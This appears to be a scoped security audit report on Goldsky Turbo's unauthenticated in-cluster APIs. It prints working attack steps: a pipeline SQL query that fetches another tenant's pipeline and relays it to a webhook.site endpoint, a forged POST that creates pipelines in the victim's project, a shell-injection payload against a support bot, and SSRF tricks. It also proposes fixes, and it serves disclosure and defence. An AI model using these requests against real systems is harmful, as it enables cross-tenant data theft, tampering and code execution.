# Goldsky Turbo: cross-tenant pipeline read/write through the unauthenticated in-cluster APIs

Date: 2026-11-15
Scope: `scope-goldsky-every-application-repo-d1ea31ab` (run `…2611150327-16831880001`)
Accounts: free test A (victim) `cmwh95cyzd0f901rzd3dp1657` / `project_cmvlqkfmh6zml01veajswaam8`;
B (attacker) `cmwh96gp7d2vq01rze08l5919` / `project_cmwh969vg31re01q07b1rgk9z`.

## Verdict on the briefed hypothesis

"Turbo lets one account reach another account's deployment by guessing the handle, while other
surfaces sanitise it" is **false for the key-scoped HTTP API**. Every `/api/admin/...` and
`/api/v1/...` pipeline route derives the project from the bearer key and scopes the lookup.
`x-goldsky-project-id` is honoured only on cookie sessions (`auth.ts:377` reads it inside
`loadActiveProjectForUser`, called only when a `goldsky_session` cookie exists); a bearer
request ignores it.

It is **true one layer down**: the streamling agent and the api-server's `/internal/compose`
routes accept `<projectId>` / `<appId>` straight from the caller and have no authentication
of their own. Tenant code inside the cluster — a Turbo pipeline is enough, no compose plan
needed — can therefore read, overwrite and create pipelines in any project whose id and
pipeline name it knows. Both are printed in the public dashboard URL
`https://app.goldsky.com/<projectId>/dashboard/pipelines/turbo/<name>`.

## Control: key surfaces are scoped

A deploys `audit-handle-1`; B with B's own key:

```
GET  /api/admin/streamling/v1/audit-handle-1            -> 404 "Pipeline 'audit-handle-1' not found"
GET  /api/admin/pipelines/v1/turbo/audit-handle-1       -> 404 "Pipeline with name: audit-handle-1 not found"
GET  /api/v1/pipelines/audit-handle-1                   -> 404 pipeline-not-found
PUT  …/streamling/v1/audit-handle-1/pause               -> 404
PUT  …/streamling/v1/audit-handle-1/restart             -> 404
DELETE …/streamling/v1/audit-handle-1                   -> 404 "no workload exists"
GET  …/streamling/v1  (with -H 'x-goldsky-project-id: <A project>') -> {"pipelines":[]}
```

Correct paths: `streamlingApiPlugin.ts:417-431` builds every upstream URL as
`/pipeline/${request.project.id}${path}`; `streamlingClient.ts:461` does the same.

## The hole

`streamling-agent` mounts every route with only a logging middleware — no auth layer
(`streamling-agent/src/main.rs:497-640`; the `.layer()` at :640 is
`middleware::from_fn(endpoint_logging_middleware)`). The only project gate is an ops
allowlist, not ownership (`api.rs:1594-1600` → `config.is_project_allowed`, `config.rs:799-803`,
which is `*` in production). The api-server's `/internal` plugin rejects nothing either
(`internal-api-plugin.ts:18-27`, "Log-only: never rejects", with an early return for
`/internal/compose`), and `parseAppId` only regex-splits the handle
(`compose-api/appId.ts:12-25`) before `internalComposePipelinesPlugin.ts:77,182,211,240,269,287`
hand the derived project straight to `StreamlingClient`.

Both names are reachable from a tenant-controlled pipeline pod: the dataset preprocessor
already calls `http://goldsky-api-service.default/internal/dataset/lookup`, and compose's own
host code calls the same service. `ctx.fetch` blocks private addresses (`compose/lib/public-fetch.ts`),
but a pipeline's SQL `_gs_fetch_abi` and its webhook sink use plain HTTP clients and do not.

### 1. Read (B reads A's deployment)

B deploys a pipeline whose SQL fetches A's pipeline from the agent and a webhook sink
re-publishes the row to a public echo:

```sql
SELECT id,
       _gs_fetch_abi('http://streamling-agent.streamling-cloud.svc.cluster.local:8124/pipeline/project_cmvlqkfmh6zml01veajswaam8/audit-handle-1','raw') AS stolen
FROM transfers
```

Captured at the webhook endpoint:

```json
{"id":"log_0x852548d1…","stolen":"{\"name\":\"audit-handle-1\",\"status\":\"ACTIVE\",…,\"definition\":{\"name\":\"audit-handle-1\",…,\"filter\":\"block_number BETWEEN 1000000 AND 1000100\"}}"}
```

A's full definition, image tag, and timestamps are now on B's endpoint.

### 2. Modify (B overwrites A's deployment)

B's pipeline builds the desired definition with `named_struct` and webhook-POSTs it to the
agent's apply route, which is `POST /pipeline/:project/:name` and takes `{definition}`:

`{"id":"…","definition":{"name":"audit-handle-1","description":"owned-by-B",…}}`

A's view afterwards (A's own key):

```json
{"updated_at":"2026-11-15T03:42:00Z","definition":{"name":"audit-handle-1","description":"owned-by-B",…}}
```

The description and topology are B's. The agent re-deploys the pod under A's namespace.

### 3. Create in A's project (and bypass A's plan limit)

B's pipeline POSTs a forged appId to the unauthenticated internal compose route:

```
POST http://goldsky-api-service.default/internal/compose/pipelines
{"appId":"project_cmvlqkfmh6zml01veajswaam8-x","name":"injected-by-b","resource_size":"xs","definition":{…}}
```

A's project list now contains a pipeline B created:

```json
{"name":"x--u--injected-by-b","status":"ACTIVE","project_id":"project_cmvlqkfmh6zml01veajswaam8","created_at":"2026-11-15T03:57:30Z"}
```

It is A's second pipeline on a free tier whose key-scoped create route refuses the second
pipeline (`403 "reached the Turbo pipelines limit"`) because the internal plugin runs no
billing/limit hooks.

## Delete

Not driven live end-to-end: `_gs_fetch_abi` is GET-only and sink/handler transforms are
POST-only, so a pipeline can reach apply but not the agent's `DELETE /pipeline/:p/:n`.
The delete handler sits on the same path behind the same `check_project_access` gate
(`main.rs:540-553`, `api.rs:1605-1615`), and the internal compose DELETE has the same appId
trust, so it is covered by the same missing check. It is marked unverified-live here.

## Impact

- Read any tenant's pipeline definition by name (sources, sinks, secrets names, topology).
- Overwrite it (the agent re-deploys; A's pod runs B's topology) — availability and
  correctness, and a way to make A's pipeline ship data somewhere else.
- Create pipelines in the victim project, bypassing pipeline-count and plan gates.
- Preconditions only: project id + pipeline name, both public in the dashboard URL. Any
  compose task, or any Turbo pipeline, can be the caller.

## Fix shape

Authenticate `/internal/*` and the agent (e.g. mTLS or a service token), or at minimum make
the internal compose routes verify the appId against the DB and have the agent check
ownership with the api-server instead of an allowlist.


## Secondary: support-bot shell injection

`packages/support-bot/src/debug-subgraph/debugSubgraph.ts` takes `subgraphDeploymentId` from the
operator prompt (:206-208) and interpolates it unquoted into `kubectl exec … graphman info -s ${id}`
(:27, also :61, :97, :124, :239). `utils.ts:170-183` runs it through `child_process.exec`, i.e.
`/bin/sh -c`. It is also interpolated into ClickHouse SQL, `WHERE subgraph_id = '${id}'` (:47-52).

Demonstrated with a stub `kubectl`:

```
CMD: kubectl exec --namespace default deploy/indexer-indexer-0-graph-node -- graphman info -s QmX; echo INJECTED; id -un
OUT: kubectl args: … -s QmX
     INJECTED
     hemanth
```

The bot runs on a support engineer's laptop with kubeconfig and Doppler/ClickHouse credentials in
the environment, so a hostile id pasted from a ticket is code execution there. `subgraphInfo.chain`,
read back out of `graphman`, is interpolated the same way.

## Secondary: /internal is log-only beyond compose

`internal-api-plugin.ts:18-27` never rejects; the token is hashed and logged only, and
`/internal/compose` returns before even that. Other routes in the same plugin take the project from
the body with no relationship check: `free-trial/index.ts:20-31` (`pause-subgraphs`),
`internalComposeWalletTablePlugin.ts:31-45` (appId → solution lookup). Any in-cluster tenant caller
can pause another project's subgraphs or read its wallet-table cursor.

## Secondary: two SSRF primitives without a private-range guard

- `edge-api/boost-providers/probe.ts:112-120` and `http.ts` fetch a customer-supplied provider URL
  with plain `fetch`; nothing checks for loopback/RFC1918/link-local. The probe's classification
  (`ENOTFOUND` vs `ECONNREFUSED` vs status, unresolved vs unreachable) makes it a service oracle.
- The chatbot's contract lookup builds `https://${network}.blockscout.com/api/v2` from the raw
  `network` argument (`core/src/utils/contracts/explorer.ts:130-131` default branch, `network.ts`
  passes through). `network = "example.com#"` yields `https://example.com#.blockscout.com/api/v2`,
  so the fragment escapes the suffix and the tool fetches an arbitrary host root with path.

## Artifacts

- Traffic echo token: `https://webhook.site/1bd5895c-8e0d-47ec-a444-bcd2aba09b6c`
- Relay used for verb tests (local, cloudflared): `https://drug-clearing-ross-alex.trycloudflare.com`
- Victim pipeline `audit-handle-1` (modified) and injected `x--u--injected-by-b` left running in the test project.
